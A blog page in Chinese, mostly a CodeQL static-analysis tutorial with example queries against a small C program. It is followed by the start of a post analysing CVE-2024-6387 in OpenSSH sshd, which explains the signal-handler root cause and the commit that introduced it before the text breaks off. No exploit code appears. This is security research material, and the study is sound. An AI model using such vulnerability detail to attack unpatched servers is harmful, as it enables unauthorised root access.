    <div class="post-body" itemprop="articleBody">

      
          <p>最近接触了一些漏洞挖掘比赛，在大神的引导下接触了CodeQL，这个常用的代码审计工具。与其他代码审计工具不同，它自己定义了一种语言，用于获取代码审计结果，这也使得该工具具有一定的学习成本。下面，我们就来学习一下该工具的使用。</p>
<p>实际上，我们可以将CodeQL语言看成Java语言与SQL语言的结合。CodeQL需要获取一个工程的构建命令，并在工程构建之时构建整个工程代码的抽象语法树（AST）。这个AST可以看做一个数据库，其中包含了工程中的所有代码逻辑，而CodeQL语言则可以对数据库进行筛选与查找，以完成对代码特定部分的审计。如我们需要获取工程中使用了哪些加密算法，工程中是否存在某种特定漏洞，都可以使用CodeQL语言定义匹配模式。</p>
<p>下面，我们就通过实例与代码结合的方式对CodeQL的语法进行学习。</p>
<h1 id="a-环境搭建与基础操作"><a class="markdownIt-Anchor" href="#a-环境搭建与基础操作"></a> A. 环境搭建与基础操作</h1>
<h2 id="a1-codeql环境安装"><a class="markdownIt-Anchor" href="#a1-codeql环境安装"></a> A.1 CodeQL环境安装</h2>
<p>VSCode对CodeQL的支持较好，这里选择以VSCode为基础搭建环境。</p>
<p>系统环境：Linux Mint</p>
<p>我们需要下载两个东西，一个是CodeQL-cli，用于编译CodeQL规则，是闭源的。第二个是第三方仓库，其中定义了很多实用的CodeQL类，后面会用到。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/github/codeql-cli-binaries/releases/download/v2.17.6/codeql-linux64.zip</span><br><span class="line">git clone https://github.com/Semmle/ql</span><br></pre></td></tr></table></figure>
<p>这里的第二条命令可能会执行失败，这可能是因为该仓库较大，可以尝试使用下面的命令完成clone：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Semmle/ql --depth 1</span><br><span class="line">cd ql/</span><br><span class="line">git fetch --unshallow</span><br></pre></td></tr></table></figure>
<p>随后，将第一个闭源的文件解压后的目录加入<code>PATH</code>中，使用<code>source</code>命令更新后，即可使用<code>codeql</code>命令。但实际上我们基本不需要在命令行中使用该命令，而是多在VSCode中完成相关配置。</p>
<h2 id="a2-创建数据库"><a class="markdownIt-Anchor" href="#a2-创建数据库"></a> A.2 创建数据库</h2>
<p>下面是使用<code>codeql</code>命令创建工程数据库的命令：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create &lt;database_dir&gt; --language=&quot;&lt;lang&gt;&quot; --command=&quot;&lt;build_command&gt;&quot; --source-root=&lt;source_root&gt;</span><br></pre></td></tr></table></figure>
<p>其中<code>database_dir</code>即为数据库的目录，<code>lang</code>为需要审计的语言，<code>build_command</code>为构建命令，<code>source_root</code>为工程的根目录。这里目录与命令中的目录最好使用绝对路径。</p>
<h2 id="a3-vscode插件"><a class="markdownIt-Anchor" href="#a3-vscode插件"></a> A.3 VSCode插件</h2>
<p>在VSCode插件界面中，搜索CodeQL后安装。</p>
<p>随后打开 “首选项 &gt; 设置”，搜索CodeQL，修改 “Code QL &gt; Cli: Executable Path” 为codeql可执行文件的路径。即完成了CodeQL插件的配置。</p>
<h1 id="b-codeql-语法"><a class="markdownIt-Anchor" href="#b-codeql-语法"></a> B. CodeQL 语法</h1>
<h2 id="b1-基本查询"><a class="markdownIt-Anchor" href="#b1-基本查询"></a> B.1 基本查询</h2>
<p>一个CodeQL脚本执行后，最终应该输出一个表格，其中保存有所有匹配该脚本中定义的模式的工程代码元素。</p>
<p>首先，我们以一个demo工程作为示例。该工程中只有1个<code>main.c</code>文件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* names[] = &#123;</span><br><span class="line">    <span class="string">&quot;Hornos&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Colin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Alex&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Torvalds&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, names[idx % <span class="number">4</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用上面的数据库生成命令为该工程生成一个数据库，构建命令为<code>gcc main.c -o test</code>。当最后输出Successfully created database at …时，即完成了数据库构建。</p>
<p>随后，我们需要在指定目录下编写CodeQL脚本，否则CodeQL将无法找到实用类。对于C/C++文件，应该在第三方仓库根目录下 /cpp/ql/examples 进行编写。</p>
<h3 id="example-01"><a class="markdownIt-Anchor" href="#example-01"></a> Example 01</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from Include include</span><br><span class="line">select include</span><br></pre></td></tr></table></figure>
<p>上面是一个简单的CodeQL脚本，用于获取工程中包含的所有头文件。这里的头文件是递归获取的。</p>
<ul>
<li><code>import cpp</code>：导入cpp，这是一个qll文件，位于/cpp/ql/examples/lib中，包含了很多实用的cpp模块。</li>
<li><code>from Include include</code>：定义筛选对象，这里的<code>Include</code>是一个类，其中定义了与C/C++头文件有关的属性等，<code>include</code>为对象名。</li>
<li><code>select include</code>：选择所有数据库中的<code>Include</code>对象并输出。</li>
</ul>
<p>编写完上面的脚本后，直接点击右上角的启动即可开始运行脚本。运行结果如下图所示。</p>
<p><img src="1.png" alt="" /></p>
<p>实际上，这里的输出是调用了<code>Include</code>类中的<code>toString</code>方法。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// ql/cpp/ql/lib/semmle/code/cpp/include.qll, line 19</span><br><span class="line"></span><br><span class="line">class Include extends PreprocessorDirective, @ppd_include &#123;</span><br><span class="line">  override string toString() &#123; result = &quot;#include &quot; + this.getIncludeText() &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>考虑到不同语言的语法结构可能有很大不同，因此对于不同的语言，第三方仓库中定义有不同的工具类，因此需要进行某种语言的审计时，最好先对该语言定义的一些模块与类进行了解。</p>
<h2 id="b2-条件查询"><a class="markdownIt-Anchor" href="#b2-条件查询"></a> B.2 条件查询</h2>
<p>如果需要在查询语句中添加一些限制条件，可以在from之后，select之前添加限制条件。</p>
<h3 id="example-02"><a class="markdownIt-Anchor" href="#example-02"></a> Example 02</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">from Literal literal</span><br><span class="line">where literal.toString().length() &gt;= 4</span><br><span class="line">select literal</span><br></pre></td></tr></table></figure>
<p>在上面的脚本中，Literal为字符串字面量类，如果没有where语句，则将获取所有的字符串字面量。这里where语句限制只选择长度不小于4的字符串字面量。最终输出结果就是我们所定义的4个字符串。</p>
<p>注意：CodeQL的字符串类属于内置数据类型，相关方法与Java基本相同，方法名都一样。CodeQL的内置数据类型有：boolean、float、int、string、date。另外单等于号既可以表示等于又可以表示赋值，放在条件判断中表示等于，其他则表示赋值。</p>
<h2 id="b3-predicate谓词"><a class="markdownIt-Anchor" href="#b3-predicate谓词"></a> B.3 predicate谓词</h2>
<p>当条件查询中的条件较为复杂时，可以通过使用predicate谓词将条件进行包装，这样可以提升脚本文件的模块化水平与可读性。</p>
<p>如上面的Example 02可以改成相同语义的下面这个脚本：</p>
<h3 id="example-03"><a class="markdownIt-Anchor" href="#example-03"></a> Example 03</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">predicate enough_string_length(Literal literal) &#123;</span><br><span class="line">    literal.toString().length() &gt;= 4</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Literal literal</span><br><span class="line">where enough_string_length(literal)</span><br><span class="line">select literal</span><br></pre></td></tr></table></figure>
<p>predicate关键字可以看做定义返回布尔类型的函数。在函数体内部，默认以最后一条语句的结果作为返回值。</p>
<h2 id="b4-函数定义"><a class="markdownIt-Anchor" href="#b4-函数定义"></a> B.4 函数定义</h2>
<p>CodeQL的函数定义与Java类似，不同的是，CodeQL以内部变量result作为返回值，不使用return关键字。</p>
<h3 id="example-04"><a class="markdownIt-Anchor" href="#example-04"></a> Example 04</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">predicate enough_string_length(Literal literal) &#123;</span><br><span class="line">    literal.toString().length() &gt;= 4</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">string long_string_upper(Literal literal) &#123;</span><br><span class="line">    result = literal.toString().toUpperCase()</span><br><span class="line">    and literal.toString().length() &gt;= 5</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Literal literal</span><br><span class="line">where enough_string_length(literal)</span><br><span class="line">select literal, long_string_upper(literal)</span><br></pre></td></tr></table></figure>
<p>需要注意的是，由于CodeQL不是专用于常规代码逻辑的语言，因此CodeQL基本没有实现代码的流程控制，在关键字中不存在通用编程语言中常见的<code>while</code>、<code>for</code>等。因此在脚本中，函数实际上也是predicate谓词的一种形式。在Example 03中，定义的谓词没有result作为返回值，因此被称为<strong>无返回值谓词</strong>。而在Example 04中，定义了一个返回值为string的谓词，称为<strong>有返回值谓词</strong>。需要注意的是，有返回值谓词不一定只能返回某个值，它还能附加上一些限制条件，如这里的<code>and literal.toString().length() &gt;= 5</code>就对传入的参数进行了限制。</p>
<p>无返回值谓词只能放在<code>where</code>关键字之后，而有返回值谓词可以放在<code>where</code>和<code>select</code>之后，均在作为返回值类型使用的同时针对内部限制条件进行筛选；如这里的长度限制就会筛选掉一个长度为4的字符串<code>Alex</code>，输出结果如下。</p>
<p><img src="2.png" alt="" /></p>
<p>可以看到，输出中最后一列的列名为<code>[1]</code>。如果需要修改这里，可以在<code>long_string_upper(literal)</code>后面添加<code>as ...</code>指定列名。</p>
<h2 id="b5-类定义与类继承"><a class="markdownIt-Anchor" href="#b5-类定义与类继承"></a> B.5 类定义与类继承</h2>
<p>CodeQL还可以定义类，类可以定义继承关系。</p>
<p>在类中可定义同名谓词，即直接以类名作为谓词使用。</p>
<h3 id="example-05"><a class="markdownIt-Anchor" href="#example-05"></a> Example 05</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">class EnoughLength extends Literal &#123;</span><br><span class="line">    EnoughLength() &#123;</span><br><span class="line">        this.toString().length() &gt;= 4</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Literal literal</span><br><span class="line">where literal instanceof EnoughLength</span><br><span class="line">select literal</span><br></pre></td></tr></table></figure>
<p>上面的例子是谓词的第三种写法，即包装在类内部。对于CodeQL中的类继承关系，可以理解为：子类是满足某些条件的父类的子集，这里的“某些条件”定义在子类的构造函数中。如这里即定义了<code>Literal</code>的子类，要求字面量长度不小于4。</p>
<p>注意：下面的写法是错误的：</p>
<h3 id="example-06-wrong"><a class="markdownIt-Anchor" href="#example-06-wrong"></a> Example 06 (WRONG)</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">class EnoughLength extends string &#123;</span><br><span class="line">    EnoughLength() &#123;</span><br><span class="line">        this.length() &gt;= 4</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Literal literal</span><br><span class="line">where literal.toString() instanceof EnoughLength</span><br><span class="line">select literal</span><br></pre></td></tr></table></figure>
<p>报错发生于EnoughLength构造函数中：The characteristic predicate for ‘test::EnoughLength’ does not bind ‘this’ to a value.</p>
<p>这个报错刚出现时，我非常困惑，询问了多个GPT也没有获得满意的结果。折腾了好一阵子之后，最终还是在CodeQL官方文档中找到了答案（还是要多看文档啊）：CodeQL在处理谓词时需要确保处理对象是一个有限集，这样才能够在有限时间内完成处理。对于上面的例子，由于string字符串类型是一个无限集，其长度可以为任意长度，因此CodeQL无法处理。相同的报错也会发生在尝试继承int、double等其他基本类型中，虽然int和double实际上在计算机中表示时本质上是有限集，但在数学上是无限集，因此当做无限集看待。</p>
<p>有一种情况例外：</p>
<h3 id="example-07"><a class="markdownIt-Anchor" href="#example-07"></a> Example 07</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class EnoughLength extends string &#123;</span><br><span class="line">    EnoughLength() &#123;</span><br><span class="line">        this in [&quot;a&quot;, &quot;b&quot;, &quot;c&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这个示例中，<code>this</code>已经被明确为一个指定集合，子类的范围已经明确，不需要确定父类范围。这种写法是正确的。</p>
<p>那么，如果非要针对无限集定义predicate，应该如何处理呢？答案是——注解<code>bindingset[]</code>。这是一种annotation注解，可以将谓词中的参数显式绑定到有限集，只需要添加一行代码，就可以让example 06通过编译：</p>
<h3 id="example-08"><a class="markdownIt-Anchor" href="#example-08"></a> Example 08</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line"></span><br><span class="line">bindingset[this]</span><br><span class="line">class EnoughLength extends string &#123;</span><br><span class="line">    EnoughLength() &#123;</span><br><span class="line">        this.length() &gt;= 4</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Literal literal</span><br><span class="line">where literal.toString() instanceof EnoughLength</span><br><span class="line">select literal</span><br></pre></td></tr></table></figure>
<p>在上例中，我们通过<code>bindingset</code>注解将类自身绑定到有限集中，这个有限集取决于使用该类的代码。如这里是<code>literal.toString()</code>，即相当于将类<code>EnoughLength</code>首先绑定到由所有<code>literal</code>调用<code>toString()</code>方法获取的有限集中。这样实际处理的就不是无限集了。</p>
<p>需要注意的是，在文档中提到，<code>bindingset</code>可以针对多个参数使用，有两种书写形式：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bindingset[x] bindingset[y]</span><br><span class="line">bindingset[x, y]</span><br></pre></td></tr></table></figure>
<p>对于第一种，它的含义是：只需要x和y的其中之一被绑定，则认定x与y均被绑定（两个绑定的指定相互独立）。对于一个有两个参数的谓词，如果只指定x绑定，则含义为：当x被绑定时，认为x和y都被绑定。</p>
<p>而对于第二种，它的含义是：x与y必须都被绑定。这种书写形式多用于带返回值的谓词中。</p>
<h3 id="example-09"><a class="markdownIt-Anchor" href="#example-09"></a> Example 09</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bindingset[x] bindingset[y]</span><br><span class="line">predicate plusOne(int x, int y) &#123;</span><br><span class="line">  x + 1 = y</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from int x, int y</span><br><span class="line">where y = 42 and plusOne(x, y)</span><br><span class="line">select x, y</span><br></pre></td></tr></table></figure>
<p>上例为CodeQL文档中的一个示例。这个示例是正确的。将<code>bindingset[x]</code>删除后依然正确，但删除<code>bindingset[y]</code>则错误。原因是where限制条件中只限制了y到一个有限集{42}，却没有限制x。CodeQL在这种情况下能够求出x的值（41）并输出。</p>
<h2 id="b6-模块"><a class="markdownIt-Anchor" href="#b6-模块"></a> B.6 模块</h2>
<p>除了类之外，CodeQL还有更加高层次的一个代码结构——模块。根据CodeQL文档，模块分为几种：</p>
<ul>
<li>文件模块：每个ql与qll后缀的文件都会隐式生成一个模块。
<ul>
<li>库模块：qll文件的模块。</li>
<li>查询模块：ql文件的模块。</li>
</ul>
</li>
<li>显式模块：使用module关键字显式声明的模块。
<ul>
<li>参数化模块：除了使用module显式声明外，还使用<code>&lt;&gt;</code>指定谓词参数的模块，相当于带有谓词泛型的模块。</li>
</ul>
</li>
</ul>
<h3 id="example-10"><a class="markdownIt-Anchor" href="#example-10"></a> Example 10</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import mymodule</span><br><span class="line"></span><br><span class="line">module mymodule &#123;</span><br><span class="line">    class EnoughLenLiteral extends Literal &#123;</span><br><span class="line">        EnoughLenLiteral() &#123;</span><br><span class="line">            this.toString().length() &gt;= 4</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Literal literal</span><br><span class="line">where literal instanceof EnoughLenLiteral</span><br><span class="line">select literal</span><br></pre></td></tr></table></figure>
<p>如上例所示，在模块中，可以定义类、谓词等，需要使用模块时，需要首先进行导入，即使该模块在当前文件中定义也需要导入。</p>
<h3 id="example-11"><a class="markdownIt-Anchor" href="#example-11"></a> Example 11</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import MyModule</span><br><span class="line"></span><br><span class="line">bindingset[x]</span><br><span class="line">signature predicate mysig(int x);</span><br><span class="line"></span><br><span class="line">module MyModuleTemplate&lt;mysig/1 limit&gt;&#123;</span><br><span class="line">    predicate enough_string_length(Literal literal) &#123;</span><br><span class="line">        limit(literal.toString().length())</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bindingset[x]</span><br><span class="line">predicate morethan3(int x) &#123; x &gt; 3 &#125;</span><br><span class="line"></span><br><span class="line">module MyModule = MyModuleTemplate&lt;morethan3/1&gt;;</span><br><span class="line"></span><br><span class="line">from Literal literal</span><br><span class="line">where MyModule::enough_string_length(literal)</span><br><span class="line">select literal</span><br></pre></td></tr></table></figure>
<p>上例展示了带有谓词参数的模块定义与实例化。<code>MyModuleTemplate</code>是我们定义的模块泛型，包含1个泛型谓词<code>limit</code>，谓词格式为<code>mysig</code>格式。这是一个谓词signature签名，在CodeQL中，signature可用于指定谓词类型，如这里的<code>signature</code>调用即定义了一个谓词格式，它具有1个<code>int</code>类型的参数、没有返回值、且参数被绑定。在泛型模块定义时，需要指定每个泛型谓词的参数个数，即<code>mysig</code>后面的<code>/1</code>，表示该泛型谓词有1个参数。在泛型模块之内，可以直接调用模块谓词。关于<code>signature</code>关键字的使用在后面将详细说明。</p>
<p>由于泛型模块内存在未确定的谓词，因此需要使用泛型模块前，首先需要指定泛型类型以将其实例化。这里的<code>MyModule</code>即为模块泛型<code>MyModuleTemplate</code>的实例化结果，它使用<code>morethan3</code>这个谓词作为泛型参数传递。</p>
<h2 id="b7-模块实现"><a class="markdownIt-Anchor" href="#b7-模块实现"></a> B.7 模块实现</h2>
<p>在CodeQL中，可以使用<code>signature</code>关键字定义一个模块签名，可以看做是一个模块接口，其他模块可以通过使用<code>implements</code>接口实现该模块。一旦要实现某个模块，必须在该模块中实现模块签名中除使用<code>default</code>修饰的所有内容，包括数据类型、类、谓词等。</p>
<h3 id="example-12"><a class="markdownIt-Anchor" href="#example-12"></a> Example 12</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import cpp</span><br><span class="line">import MyModule</span><br><span class="line"></span><br><span class="line">signature module MyModuleTemplate&#123;</span><br><span class="line">    predicate enough_string_length(Literal literal);</span><br><span class="line">    default string description() &#123; result = &quot;Default description&quot; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module MyModule implements MyModuleTemplate &#123;</span><br><span class="line">    predicate enough_string_length(Literal literal) &#123;</span><br><span class="line">        literal.toString().length() &gt; 3</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Literal literal</span><br><span class="line">where MyModule::enough_string_length(literal)</span><br><span class="line">select literal, MyModule::description()</span><br></pre></td></tr></table></figure>
<p>在上例中，我们定义了一个模块签名<code>MyModuleTemplate</code>，其中定义了一个谓词，在模块签名中的谓词不需要使用<code>signature</code>，会默认将其看做谓词签名。下面还定义了一个<code>default</code>修饰的谓词，这个谓词可以选择不实现，这样实例化模块中会直接�</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2024/07/02/CVE-2024-6387-%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/07/02/CVE-2024-6387-%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">CVE-2024-6387 分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-07-02 10:52:01" itemprop="dateCreated datePublished" datetime="2024-07-02T10:52:01+08:00">2024-07-02</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-07-19 10:37:13" itemprop="dateModified" datetime="2024-07-19T10:37:13+08:00">2024-07-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>9.8k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>9 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>近几天，OpenSSH 爆出了一个非常严重的安全漏洞，该漏洞可导致未授权的root权限任意代码执行，即 Unauthorized root RCE。部分媒体评估称，该漏洞预计将影响超过 1400 万台使用含有该漏洞的计算机设备，其中以 Linux 发行版为主。该漏洞主要影响版本为 [8.5p1, 9.8p1)，在 9.8p1 版本中 OpenSSH 将其修复，可通过 OpenSSH release notes 查看。这个漏洞的影响是毁灭性的，它可以在基于 glibc 的 Linux 系统上远程利用，获得未经授权的Root级别代码执行。更令人担忧的是，sshd以完全特权运行，且未沙箱化，这使得攻击面更加严峻。目前，针对搭载 Glibc 的 32 位 Linux 发行版的漏洞 PoC 已经发布，根据漏洞发现者披露，该漏洞在 64 位 Linux 中很可能也可以进行利用，对于 MacOS 与 Windows 也有一定的潜在风险。</p>
<p>下面对该漏洞进行简要分析。</p>
<p>分析使用的OpenSSH版本：9.7p1</p>
<p>参考资料：<a target="_blank" rel="noopener" href="https://www.qualys.com/2024/07/01/cve-2024-6387/regresshion.txt">资料</a></p>
<h1 id="a-漏洞成因"><a class="markdownIt-Anchor" href="#a-漏洞成因"></a> A. 漏洞成因</h1>
<p>这个漏洞可以看做是 CVE-2006-5051 的重演，该漏洞在 8.5p1 版本被引入，产生的原因是在 commit 752250C 中错误地删除了 sigdie() 函数中的一条语句 <code>#ifdef DO_LOG_SAFE_IN_SIGHAND</code>，该函数在<code>SIGALRM</code>信号的 handler 函数中被直接调用。因此实际上该漏洞对于 &lt;4.4p1 版本的 OpenSSH 也有效。</p>
<p>commit 信息：<a target="_blank" rel="noopener" href="https://github.com/openssh/openssh-portable/commit/752250caabda3dd24635503c4cd689b32a650794#diff-cac4c5e540bb96b16908efb139929424aa8065d1acaa0af3791e19aa775bbf42">链接</a></p>
<p><img src="4.png" alt="" /></p>
<p>在 SSHd 的 main 函数中，通过 <code>ssh_signal</code> 函数注册了对于 <code>SIGALRM</code> 信号的 handler 函数 <code>grace_alarm_handler</code>。在 SSHd 中，如果客户端在 <code>LoginGraceTime</code> （较新版本默认为120s）时间内没有完成认证，则会产生 <code>SIGALRM</code> 信号，并异步调用 <code>grace_alarm_handler</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sshd.c, line 2222</span></span><br><span class="line"></span><br><span class="line">ssh_signal(SIGALRM, grace_alarm_handler);</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"><span class="comment">// sshd.c, line 